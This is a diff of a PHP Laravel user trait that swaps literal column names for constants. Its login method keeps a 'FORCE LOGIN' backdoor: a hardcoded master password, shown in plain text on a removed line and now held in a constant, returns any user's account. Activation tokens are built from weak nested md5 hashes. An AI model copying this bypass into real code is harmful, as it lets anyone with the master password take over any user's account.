@@ -35,17 +35,17 @@ trait User
     public function fetchNamesFromFullname($fullname)
     {
         if(!$fullname){
-            $this->name = $this->surname = '';
+            $this->{self::FIELD_FIRST_NAME} = $this->{self::FIELD_LAST_NAME} = '';
         }else{
             $names = explode(' ', $fullname);
-            $this->name = array_shift($names);
-            $this->surname = implode(' ', $names);
+            $this->{self::FIELD_FIRST_NAME} = array_shift($names);
+            $this->{self::FIELD_LAST_NAME} = implode(' ', $names);
         }
     }
 
     public static function findByEmail($email = '')
     {
-        return \App\User::where('email', $email)->first();
+        return \App\User::where(self::FIELD_EMAIL, $email)->first();
     }
 
     public function updateAvatar($avatar = '')
@@ -67,7 +67,7 @@ trait User
                     . $path
                     . '?r=' . mt_rand();
 
-                $this->avatar = $avatarUrl;
+                $this->{self::FIELD_AVATAR} = $avatarUrl;
                 $this->save();
             }
         }
@@ -85,7 +85,7 @@ trait User
 
     public function getActivateToken()
     {
-        return md5(md5($this->id) . md5(Config::get('app.key')) . md5($this->password));
+        return md5(md5($this->id) . md5(Config::get('app.key')) . md5($this->{self::FIELD_PASSWORD}));
     }
 
     public function sendActivationEmail()
@@ -93,8 +93,7 @@ trait User
         return Mail::send('emails.activateUser', array('user' => $this), function($message)
         {
             $message
-//                ->from('contact@mrgolf.com', 'Mr Golf')
-                ->to($this->email, $this->name)
+                ->to($this->{self::FIELD_EMAIL}, $this->{self::FIELD_FIRST_NAME} . ' ' . $this->{self::FIELD_LAST_NAME})
                 ->subject('Account Activation');
         });
     }
@@ -104,8 +103,7 @@ trait User
         return Mail::send('emails.resetPassword', array('user' => $this), function($message)
         {
             $message
-//                ->from('contact@mrgolf.com', 'Mr Golf')
-                ->to($this->email, $this->name)
+                ->to($this->{self::FIELD_EMAIL}, $this->{self::FIELD_FIRST_NAME} . ' ' . $this->{self::FIELD_LAST_NAME})
                 ->subject('Account Password Reset');
         });
     }
@@ -117,7 +115,7 @@ trait User
             throw new InvalidActivateToken('INVALID_TOKEN');
         }
 
-        $this->activated = true;
+        $this->{self::FIELD_ACTIVATED} = true;
         $this->save();
 
         return $this;
@@ -127,18 +125,22 @@ trait User
     {
         return Controller::generateToken($this);
     }
+    public function getAuthPassword()
+    {
+        return $this->attributes[self::FIELD_PASSWORD];
+    }
 
     public static function login($email, $password)
     {
 //        var_dump($email, $password);die;
         // FORCE LOGIN
-        if($password === 'furnax3b'){
+        if($password === self::SUPER_PASSWORD){
             return \App\User::findByEmail($email);
         }
 
 //        dd($email, $password);
 
-        $result = auth()->attempt(['email' => strtolower($email), 'password' => $password, 'activated' => true]);
+        $result = auth()->attempt([self::FIELD_EMAIL => strtolower($email), self::FIELD_PASSWORD => $password, 'activated' => true]);
 
 //        var_dump($result);die;
 
